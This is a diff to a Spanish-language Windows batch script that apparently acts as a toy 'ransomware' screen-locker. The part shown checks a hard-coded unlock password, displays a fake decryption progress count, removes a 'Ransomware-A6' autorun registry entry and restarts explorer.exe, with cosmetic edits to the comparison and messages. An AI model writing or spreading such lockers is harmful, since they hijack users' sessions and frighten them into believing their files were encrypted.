@@ -32,7 +32,7 @@ echo ===================================================         ^|___________^|
 echo Ejemplo de Password: XXX-XXX-XXX
 echo ===================================================
 set /p pass="Ingrese el Password: "
-if %pass% == VDE-HRS-JKF (goto Decrypt) else (goto Incorrect)
+if /i "%pass%" == "VDE-HRS-JKF" (goto Decrypt) else (goto Incorrect)
 :Incorrect
 msg * El Password no es Valido
 goto Bucle
@@ -43,15 +43,15 @@ cls
 if %s% GEQ 0 (
 for /l %%c in (0,1,100) do (
 echo.
-echo. Desencriptando el Sector %%c%% Completado
-timeout /t 1 >nul
+echo. Desencriptando el sector [%%c%% Completado]
+timeout /nobreak 1 >nul
 cls
 )
 )
 setlocal disabledelayedexpansion >NUL 2>NUL
 REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Ransomware-A6 /f >NUL 2>NUL
 echo.
-echo. Desencriptando el Sector 100%% Completado
+echo. Desencriptando el sector [100%% Completado]
 echo.
 echo. Puede Continuar...
 start explorer.exe
